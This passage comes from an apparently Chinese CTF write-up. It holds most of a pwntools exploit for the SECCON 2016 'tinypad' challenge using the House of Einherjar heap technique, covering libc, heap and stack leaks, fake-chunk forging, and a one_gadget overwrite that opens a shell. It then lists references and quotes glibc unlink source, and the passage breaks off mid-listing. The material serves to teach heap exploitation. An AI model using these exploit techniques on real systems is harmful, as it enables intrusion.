operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(SIZE)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'D'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'E'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(Y/n)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Y'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>unsortedbin_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'unsortedbin_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>main_arena <span class=\"token operator\">=</span> unsortedbin_addr <span class=\"token operator\">-</span> <span class=\"token number\">88</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>libc_base <span class=\"token operator\">=</span> main_arena <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 2\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>heap_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>heap_base <span class=\"token operator\">=</span> heap_addr <span class=\"token operator\">-</span> <span class=\"token number\">0xe0</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>tinypad <span class=\"token operator\">=</span> <span class=\"token number\">0x602040</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>offset <span class=\"token operator\">=</span> heap_base <span class=\"token operator\">-</span> tinypad</pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>pl1 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pl1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>env <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>pl3 <span class=\"token operator\">=</span> <span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x602148</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>pl3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>og <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>main_ret <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">30</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'Q'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考:</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzI2Nj90aW1lX18xMzExPW40JTJCeG5EMER5N0clM0RCRXhCcW9vM0dRTEs3S2l0REJqRCUyQk9vRA==\">House of 系列堆漏洞详解 (一) - 先知社区 (aliyun.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yb2Rlcmlja2NoYW4uZ2l0aHViLmlvL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyMi1ob3VzZS1vZi1laW5oZXJqYXI=\">Glibc 堆利用之 house of 系列总结 - roderick - record and learn! (roderickchan.github.io)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9ob3VzZS1vZi1laW5oZXJqYXIv\">House Of Einherjar - CTF Wiki (ctf-wiki.org)</span></p>\n<p>[House Of Einherjar - 原理 | Pwn 进你的心 (<span class=\"exturl\" data-url=\"aHR0cDovL3l3aGtreC5naXRodWIuaW8=\">ywhkkx.github.io</span>)](<span class=\"exturl\" data-url=\"aHR0cHM6Ly95d2hra3guZ2l0aHViLmlvLzIwMjIvMDMvMDgvSG91c2U=\">https://ywhkkx.github.io/2022/03/08/House</span> Of Einherjar - 原理 /)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjUxNTk2\">PWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ltczAyMTEvYXJ0aWNsZS9kZXRhaWxzLzEyNzA1MTMwNQ==\">2016 Seccon tinypad-CSDN 博客</span></p>\n</blockquote>\n<p>增文：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate backward */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      prevsize <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>prev_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token expression\">FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token expression\">BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token expression\"><span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token expression\"><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token expression\">FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token expression\">BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token expression\"><span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t    <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token expression\"><span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t      <span class=\"token expression\"><span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t       <span class=\"token string\">\"corrupted double-linked list (not small)\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span>    </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t       <span class=\"token expression\">P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                  <span class=\"token expression\">FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token expression\"><span class=\"token keyword\">else</span> <span class=\"token 